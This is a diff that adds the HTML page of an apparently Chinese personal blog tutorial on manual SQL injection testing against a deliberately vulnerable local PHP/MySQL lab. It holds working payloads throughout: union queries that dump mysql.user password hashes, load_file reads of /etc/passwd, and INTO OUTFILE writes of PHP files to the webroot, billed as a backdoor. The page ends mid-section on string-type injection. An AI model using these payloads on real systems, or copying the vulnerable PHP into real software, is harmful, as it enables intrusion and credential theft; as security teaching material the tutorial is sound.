@@ -1,0 +1,1018 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html class="theme-next gemini" lang>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.0.1">
+
+
+
+
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.0.1',
+    sidebar: {"position":"left","display":"hide","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: true,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"expandIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="SQL注入,就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串,最终达到欺骗服务器执行恶意的SQL命令,具体来说,它是利用现有应用程序将(恶意的)SQL命令注入到后台数据库引擎执行的能力,它可以通过在Web表单中输入SQL语句得到一个存在安全漏洞的网站上的数据库,而不是按照设计者意图去执行SQL语句,下面我们将演示SQL注入的一些原理性的东西.">
+<meta name="keywords" content="渗透测试">
+<meta property="og:type" content="article">
+<meta property="og:title" content="手工检测SQL注入漏洞">
+<meta property="og:url" content="https://www.mkdirs.com/2019/03/28/渗透测试/手工检测SQL注入漏洞/index.html">
+<meta property="og:site_name" content="我的个人博客">
+<meta property="og:description" content="SQL注入,就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串,最终达到欺骗服务器执行恶意的SQL命令,具体来说,它是利用现有应用程序将(恶意的)SQL命令注入到后台数据库引擎执行的能力,它可以通过在Web表单中输入SQL语句得到一个存在安全漏洞的网站上的数据库,而不是按照设计者意图去执行SQL语句,下面我们将演示SQL注入的一些原理性的东西.">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-04-16T12:03:15.008Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="手工检测SQL注入漏洞">
+<meta name="twitter:description" content="SQL注入,就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串,最终达到欺骗服务器执行恶意的SQL命令,具体来说,它是利用现有应用程序将(恶意的)SQL命令注入到后台数据库引擎执行的能力,它可以通过在Web表单中输入SQL语句得到一个存在安全漏洞的网站上的数据库,而不是按照设计者意图去执行SQL语句,下面我们将演示SQL注入的一些原理性的东西.">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="我的个人博客" type="application/atom+xml">
+
+
+
+
+  <link rel="canonical" href="https://www.mkdirs.com/2019/03/28/渗透测试/手工检测SQL注入漏洞/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>手工检测SQL注入漏洞 | 我的个人博客</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">我的个人博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>首页</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>归档</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-categories">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/categories/" rel="section"><i class="menu-item-icon fa fa-fw fa-th"></i> <br>分类</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>标签</a>
+
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://www.mkdirs.com/2019/03/28/渗透测试/手工检测SQL注入漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="王瑞">
+      <meta itemprop="description" content="记录点滴技术成长之路">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="我的个人博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">手工检测SQL注入漏洞
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2019-03-28 10:30:22" itemprop="dateCreated datePublished" datetime="2019-03-28T10:30:22+08:00">2019-03-28</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">更新于</span>
+                
+                <time title="修改时间：2019-04-16 20:03:15" itemprop="dateModified" datetime="2019-04-16T20:03:15+08:00">2019-04-16</time>
+              
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/渗透测试/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>SQL注入,就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串,最终达到欺骗服务器执行恶意的SQL命令,具体来说,它是利用现有应用程序将(恶意的)SQL命令注入到后台数据库引擎执行的能力,它可以通过在Web表单中输入SQL语句得到一个存在安全漏洞的网站上的数据库,而不是按照设计者意图去执行SQL语句,下面我们将演示SQL注入的一些原理性的东西.</p>
+<a id="more"></a>
+<p><br></p>
+<h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p>数字型注入是最常规的一种注入方式,通常存在于网页的链接地址中,例如<code>index.php?id=</code>这样的类型,通常存在可利用的地方,这里通过一个例子来学习数字型注入的一些注入技巧.</p>
+<h3 id="◆搭建演练环境◆"><a href="#◆搭建演练环境◆" class="headerlink" title="◆搭建演练环境◆"></a>◆搭建演练环境◆</h3><p>1.首先我这里使用的是Centos7,在该系统上通过Yum搭建LAMP的环境.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># yum install -y httpd httpd-devel \</span></span><br><span class="line">mariadb mariadb-server mysql-devel \</span><br><span class="line">php php-mysql php-common php-gd php-xml</span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># systemctl restart httpd</span></span><br><span class="line">[root@localhost ~]<span class="comment"># systemctl restart mariadb</span></span><br><span class="line">[root@localhost ~]<span class="comment"># systemctl enable httpd</span></span><br><span class="line">[root@localhost ~]<span class="comment"># systemctl enable mariadb</span></span><br></pre></td></tr></table></figure></p>
+<p>2.进入MySQL并创建一个测试用的数据表,写入一些测试所使用的查询数据.<br><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># mysql -uroot -p1233</span></span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; create database lyshark;</span><br><span class="line">Query OK, 1 row affected (0.01 sec)</span><br><span class="line">MariaDB [(none)]&gt; use lyshark;</span><br><span class="line">Database changed</span><br><span class="line"></span><br><span class="line">MariaDB [lyshark]&gt; create table lyshark (</span><br><span class="line">    -&gt; id int(10) not null,</span><br><span class="line">    -&gt; title varchar(1000) not null,</span><br><span class="line">    -&gt; text varchar(2000) not null</span><br><span class="line">    -&gt; );</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br><span class="line"></span><br><span class="line">MariaDB [lyshark]&gt; create table user(id int ,name char(30),pass char(40));</span><br><span class="line">MariaDB [lyshark]&gt; create table pwd(id int ,name char(30),pass char(40));</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="string">`lyshark`</span> (<span class="string">`id`</span>, <span class="string">`title`</span>, <span class="string">`text`</span>) <span class="keyword">values</span> (<span class="number">1</span>,<span class="string">'admin'</span>,<span class="string">'hello admin'</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="string">`lyshark`</span> (<span class="string">`id`</span>, <span class="string">`title`</span>, <span class="string">`text`</span>) <span class="keyword">values</span> (<span class="number">2</span>,<span class="string">'lyshark'</span>,<span class="string">'hello lyshark'</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="string">`lyshark`</span> (<span class="string">`id`</span>, <span class="string">`title`</span>, <span class="string">`text`</span>) <span class="keyword">values</span> (<span class="number">3</span>,<span class="string">'guest'</span>,<span class="string">'hello guest'</span>);</span><br></pre></td></tr></table></figure></p>
+<p>3.在网站目录下新建一个<code>index.php</code>文件,并配置好权限,这里需要关闭<code>Selinux</code>和<code>Iptables</code>防火墙.<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># setenforce 0</span></span><br><span class="line">[root@localhost ~]<span class="comment"># iptables -F</span></span><br><span class="line">[root@localhost ~]<span class="comment">#</span></span><br><span class="line">[root@localhost ~]<span class="comment"># vim /var/www/html/index.php</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">	$connection = mysql_connect(<span class="string">"127.0.0.1"</span>,<span class="string">"root"</span>,<span class="string">"1233"</span>);</span><br><span class="line">	mysql_select_db(<span class="string">"lyshark"</span>,$connection);</span><br><span class="line">	$myquery = <span class="string">"select * from lyshark where id=$id"</span>;</span><br><span class="line">	$result = mysql_query($myquery);</span><br><span class="line">	<span class="keyword">while</span>($row = mysql_fetch_array($result))&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"编号: "</span>.$row[<span class="string">'id'</span>].<span class="string">"&lt;br &gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"标题: "</span>.$row[<span class="string">'title'</span>].<span class="string">"&lt;br &gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"内容: "</span>.$row[<span class="string">'text'</span>].<span class="string">"&lt;br &gt;"</span>;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	mysql_close($connection);</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"后台执行的SQL语句: "</span>.$myquery.<span class="string">"&lt;hr&gt;"</span>;</span><br><span class="line">	<span class="comment">#mysql_free_result($result);</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">[root@localhost ~]<span class="comment"># chmod 755 -R /var/www/html/index.php</span></span><br><span class="line">[root@localhost ~]<span class="comment"># chown apache.apache /var/www/html/index.php</span></span><br><span class="line">[root@localhost ~]<span class="comment"># systemctl restart httpd</span></span><br></pre></td></tr></table></figure></p>
+<p>4.最后访问这个页面,并传入一个参数,即可查看返回结果.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># curl http://127.0.0.1/index.php?id=1</span></span><br><span class="line">[root@localhost ~]<span class="comment"># curl http://127.0.0.1/index.php?id=2</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="◆判断注入点◆"><a href="#◆判断注入点◆" class="headerlink" title="◆判断注入点◆"></a>◆判断注入点◆</h3><p><strong>提交单引号:</strong> 通过提交单引号并根据返回结果判断是否存在注入点,如果返回正常说明存在注入点.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># curl http://127.0.0.1/index.php?id=1'</span></span><br><span class="line"></span><br><span class="line">执行的SQL语句: select * from lyshark <span class="built_in">where</span> id=1<span class="string">'</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>提交AND判断:</strong> 也可以使用and语句来判断是否存在注入.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># curl http://127.0.0.1/index.php?id=1 and 1=1</span></span><br><span class="line">执行的SQL语句: select * from lyshark <span class="built_in">where</span> id=1 and 1=1</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">[root@localhost ~]<span class="comment"># curl http://127.0.0.1/index.php?id=1 and 1=0</span></span><br><span class="line">执行的SQL语句: select * from lyshark <span class="built_in">where</span> id=1 and 1=0</span><br></pre></td></tr></table></figure></p>
+<p>以上注入可发现<code>and 1=1</code>返回了数据,而<code>and 1=0</code>则没有返回,这是由于<code>and 1=1</code>是一个为真的条件,所以返回了而<code>and 1=0</code>结果为假也就没有结果,这里也能看出我们的注入语句被数据库执行了.</p>
+<p><strong>提交OR判断:</strong> 同样的使用OR语句也是可以判断数据库权限的.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># curl http://192.168.1.11/index.php?id=1 or 1=1</span></span><br><span class="line">执行的SQL语句: select * from lyshark <span class="built_in">where</span> id=1 and 1=1</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">[root@localhost ~]<span class="comment"># curl http://192.168.1.11/index.php?id=1 or 1=0</span></span><br><span class="line">执行的SQL语句: select * from lyshark <span class="built_in">where</span> id=1 and 1=0</span><br></pre></td></tr></table></figure></p>
+<p><strong>提交加号:</strong> 我们在参数输入<code>1+1</code>,看返回的数据是不是id等于2的结果,这里注意一下+号在SQL语句是有特效含义的,所以我们要对其进行url编码,最后也就是%2b.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># curl http://127.0.0.1/index.php?id=1%2b1</span></span><br><span class="line"></span><br><span class="line">执行的SQL语句: select * from lyshark <span class="built_in">where</span> id=1+1</span><br></pre></td></tr></table></figure></p>
+<p><strong>提交减号:</strong> 同样的道理,提交减号也可以实现判断注入点,这里不需要进行编码转化.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]<span class="comment"># curl http://127.0.0.1/index.php?id=2-1</span></span><br><span class="line"></span><br><span class="line">执行的SQL语句: select * from lyshark <span class="built_in">where</span> id=2-1</span><br></pre></td></tr></table></figure></p>
+<h3 id="◆常用判断语句◆"><a href="#◆常用判断语句◆" class="headerlink" title="◆常用判断语句◆"></a>◆常用判断语句◆</h3><p><strong>判断ROOT权限:</strong> 判断数据库是否具有ROOT权限,如果返回了查询结果说明具有权限.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 and ord(mid(user(),1,1)) = 114</span><br></pre></td></tr></table></figure></p>
+<p><strong>判断权限大小:</strong> 如果结果返回正常,说明具有读写权限,返回错误,应该是管理员给数据库帐户降权了.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 and(select count(*) from mysql.user) &gt; 0</span><br></pre></td></tr></table></figure></p>
+<p><strong>查询管理密码:</strong> 查询MySQL的管理密码,这里的<code>#末尾警号</code>,是注释符的意思,说明后面的都是注释.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 union select host,user,password from mysql.user<span class="comment">#                   // 5.6以前版本</span></span><br><span class="line">index.php?id=1 union select host,user,authentication_string from mysql.user<span class="comment">#      // 5.7以后版本</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>向主站写入后门:</strong> 可以写入一句话后门,但在linux系统上目录必须具有读写和执行权限.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 union select 1,1,load_file(<span class="string">"/etc/passwd"</span>) into outfile <span class="string">'/var/www/html/a.txt'</span></span><br><span class="line">index.php?id=1 union select null,null,<span class="string">"&lt;?php phpinfo();?&gt;"</span>  into outfile <span class="string">'/var/www/html/a.php'</span></span><br><span class="line">index.php?id=1 union select 1,1,load_file(char(111,116,46,105,110,105))</span><br></pre></td></tr></table></figure></p>
+<p><strong>常用判断语句:</strong> 下面是一些常用的注入查询语句,包括查询主机名等敏感操作.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 union select 1,1,load_file(<span class="string">"/etc/passwd"</span>)       // 加载指定文件</span><br><span class="line">index.php?id=1 union select 1,1,@@datadir                      // 判断数据库目录</span><br><span class="line">index.php?id=1 union select 1,1,@@basedir                      // 判断安装根路径</span><br><span class="line">index.php?id=1 union select 1,1,@@hostname                     // 判断主机名</span><br><span class="line">index.php?id=1 union select 1,1,@@version                      // 判断数据库版本</span><br><span class="line"></span><br><span class="line">index.php?id=1 union select 1,1,@@version_compile_os           // 判断系统类型(Linux)</span><br><span class="line">index.php?id=1 union select 1,1,@@version_compile_machine      // 判断系统体系(x86)</span><br><span class="line"></span><br><span class="line">index.php?id=1 union select 1,1,user()                         // 曝出系统用户</span><br><span class="line">index.php?id=1 union select 1,1,database()                     // 曝出当前数据库</span><br></pre></td></tr></table></figure></p>
+<h3 id="◆判断表字段数◆"><a href="#◆判断表字段数◆" class="headerlink" title="◆判断表字段数◆"></a>◆判断表字段数◆</h3><p><strong>Union 查询字段:</strong> Union可以用于一个或多个SELECT的结果集,但是他有一个条件,就是两个select查询语句的查询必须要有相同的列才可以执行,利用这个特性我们可以进行对比查询,也就是说当我们<code>union select</code>的列与它查询的列相同时,页面返回正常,而在and后面加上<code>1=1或1=2</code>的作用后面会讲.</p>
+<p>a.首先我们猜测,当前<code>字段数为2</code>的时候,页面会返回错误,也就说明表字段数必然是大于2的.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 and 1=1 union select 1,2</span><br><span class="line"></span><br><span class="line">执行的SQL语句: select * from lyshark <span class="built_in">where</span> id=1 and 1=1 union select 1,2</span><br></pre></td></tr></table></figure></p>
+<p>b.在上面的基础上,我们<code>增加一个字段</code>,<code>查询1,2,3</code>时页面显示正常,说明表结构是3个字段的.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 and 1=1 union select 1,2,3</span><br><span class="line"></span><br><span class="line">执行的SQL语句: select * from lyshark <span class="built_in">where</span> id=1 and 1=1 union select 1,2,3</span><br></pre></td></tr></table></figure></p>
+<p>c.为了验证数据库是否为3个字段,我们<code>增加到4个字段</code>,发现页面<code>显示错误</code>,则证明肯定是3个字段.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 and 1=1 union select 1,2,3,4</span><br><span class="line"></span><br><span class="line">执行的SQL语句: select * from lyshark <span class="built_in">where</span> id=1 and 1=1 union select 1,2,3,4</span><br></pre></td></tr></table></figure></p>
+<p>上面的结果,说明<code>字段数就是3</code>,输入的数大于或小于字段数时都会报错,而使用<code>union select null,null,null</code>替换<code>1,2,3</code>是相同的效果用数字也可以.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 and 1=1 union select null,null,null <span class="comment">#</span></span><br><span class="line"></span><br><span class="line">执行的SQL语句: select * from lyshark <span class="built_in">where</span> id=1 and 1=1 union select null,null,null</span><br></pre></td></tr></table></figure></p>
+<p><strong>Order By查询字段:</strong> 在SQL语句中是对结果集的指定列进行排序,比如我们想让结果集按照第一列排序就是<code>order by 1</code>按照第二列排序<code>order by 2</code>依次类推,按照这个原理我们来判断他的字段数,如果我们<code>按照第1列进行排序</code>数据库会返回正常,但是当我们<code>按照第100列排序</code>,但是数据库中并不存在第100列,从而报错.</p>
+<p>a.首先我们<code>猜测</code>数据库<code>有4个字段</code>,尝试<code>根据第四行进行排序</code>发现数据无法显示,说明是小于4的.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 order by 4 <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p>b.上面查询没有显示任何结果,我们查询4个字段无返回值,说面该表小于4个字段,我们<code>继续使用3测试</code>,此时返回了结果.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 order by 3 <span class="comment">#</span></span><br></pre></td></tr></table></figure></p>
+<p>大部分程序只会调用数据库查询的第一条语句进行查询然后返回,而通过联合查询出的数据中,我们想看到的数据是在第二条语句中,如果我们想看到我们想要的数据有两种方法,第一种是让第一条数据返回假,第二种是通过sql语句直接返回我们想要的数据.</p>
+<p>第一种：我们让第一个查询的结果始终为假,通过使用<code>and 0</code>来实现,下面的标号啥的就干净了.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 and 0 union select null,null,null</span><br><span class="line"></span><br><span class="line">执行的SQL语句: select * from lyshark <span class="built_in">where</span> id=1 and 0 union select null,null,null</span><br></pre></td></tr></table></figure></p>
+<p>第二种：通过limit语句,limit在mysql中是用来分页的,通过他可以从查询出来的数据中获取我们想要的数据.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 union select null,null,null <span class="built_in">limit</span> 1,1</span><br><span class="line"></span><br><span class="line">执行的SQL语句: select * from lyshark <span class="built_in">where</span> id=1 union select null,null,null <span class="built_in">limit</span> 1,1</span><br></pre></td></tr></table></figure></p>
+<p>上面结果返回也是空,因为这使用的null,所以返回的还是null</p>
+<h3 id="◆查库与表名称◆"><a href="#◆查库与表名称◆" class="headerlink" title="◆查库与表名称◆"></a>◆查库与表名称◆</h3><p><strong>查当前数据库名称:</strong> 可以直接使用MySQL自带函数<code>database()</code>来查询得到当前使用的数据库.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 and 0 union select 1,1,database()</span><br></pre></td></tr></table></figure></p>
+<p><strong>查全部数据库名称:</strong> 使用以下语句语句得到所有的数据库名,<code>and 1=0</code>功能是不显示第一行.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 and 0 union select 1,1,schema_name from information_schema.schemata</span><br></pre></td></tr></table></figure></p>
+<p><strong>查指定数据库名称:</strong> 用来查询第一个数据库的名称,但这个写法有个小问题,继续往下看.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 union select null,null,schema_name from information_schema.schemata <span class="built_in">limit</span> 0,1</span><br></pre></td></tr></table></figure></p>
+<p>以上查询结果,并没有显示数据库名而显示的是第一条语句查询出来的结果,在union前面加上<code>and 0</code>就能显示出来了.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 and 0 union select null,null,schema_name from information_schema.schemata <span class="built_in">limit</span> 0,1</span><br></pre></td></tr></table></figure></p>
+<p>以下查询方式,根据控制<code>limit 0,1,2,3....</code>,我们既可以获取到指定数量的数据库名称.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 and 0 union select null,schema_name,null from information_schema.schemata <span class="built_in">limit</span> 1,1</span><br><span class="line">index.php?id=1 and 0 union select null,schema_name,null from information_schema.schemata <span class="built_in">limit</span> 2,1</span><br><span class="line">index.php?id=1 and 0 union select null,schema_name,null from information_schema.schemata <span class="built_in">limit</span> 3,1</span><br></pre></td></tr></table></figure></p>
+<p><strong>查表名称(1):</strong> 通过使用<code>group_concat</code>可以返回查询的所有结果,因为我们需要通过命名判断该我们需要的敏感数据.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 and 0 union select 1,1,group_concat(table_name) </span><br><span class="line">&gt;                    from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">'lyshark'</span>  <span class="comment">#查lyshark库中表名称</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>查表名称(2):</strong> 同样,使用下面的语句也是可以查出数据库中的表,但该查询方式会分行显示查询的结果.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 and 0 union select 1,1,table_name</span><br><span class="line">&gt;                    from information_schema.tables <span class="built_in">where</span> table_schema=<span class="string">'lyshark'</span>  <span class="comment">#查lyshark库中表名称</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="◆查字段与数据◆"><a href="#◆查字段与数据◆" class="headerlink" title="◆查字段与数据◆"></a>◆查字段与数据◆</h3><p><strong>查表中字段(1):</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 and 1=1 union select 1,1,group_concat(column_name)</span><br><span class="line">&gt;              from information_schema.columns</span><br><span class="line">&gt;              <span class="built_in">where</span> table_schema=<span class="string">'lyshark'</span> and table_name=<span class="string">'lyshark'</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>查表中字段(2):</strong> 也可以查看mysql库user表中的字段,进行一个查询.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 and 1=1 union select 1,1,group_concat(column_name)</span><br><span class="line">&gt;              from information_schema.columns</span><br><span class="line">&gt;              <span class="built_in">where</span> table_schema=<span class="string">'mysql'</span> and table_name=<span class="string">'user'</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>查表中字段(3):</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=2 union select null,null,column_name</span><br><span class="line">&gt;              from information_schema.columns</span><br><span class="line">&gt;              <span class="built_in">where</span> table_schema=<span class="string">'mysql'</span> and table_name=<span class="string">'user'</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>查表中数据:</strong> 查询表中数据,我们可以使用以下三种方式进行查询.<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">index.php?id=1 union select Host,User,Password from mysql.user</span><br><span class="line"></span><br><span class="line">index.php?id=1 and 1=1 union select 1,1,group_concat(id,title,text) from lyshark</span><br><span class="line"></span><br><span class="line">index.php?id=1 and 1=1 union select 1,1,group_concat(Host,User,Password) from mysql.user</span><br></pre></td></tr></table></figure></p>
+<p><br></p>
+<h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><p>字符串或串(String)是由数字、字母、下划线组成的一串字符,一般记为<code>s=&quot;a1 a2···an &quot;(n&gt;=0)</code>,它是编程语言中表示文本的数据类型,字符型注入就是把输入的参数当做字符串来对数据库进行查询,字符型注入在sql语句中都采用单引号括起来,接下来看一段SQL语句.</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$query=<span class="string">"select first_name from users where id='$_GET['id']'"</span>;</span><br></pre></td></tr></table></figure>
+<p>上面的这句SQL语句就是基于用户输入的id在users表中找到相应的first_name,正常用户当然会输入例如<code>1,2</code>等,但是如果有人输入以下恶意语句则就会引发注入.<br><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">' union select database() #;</span></span><br></pre></td></tr></table></figure></p>
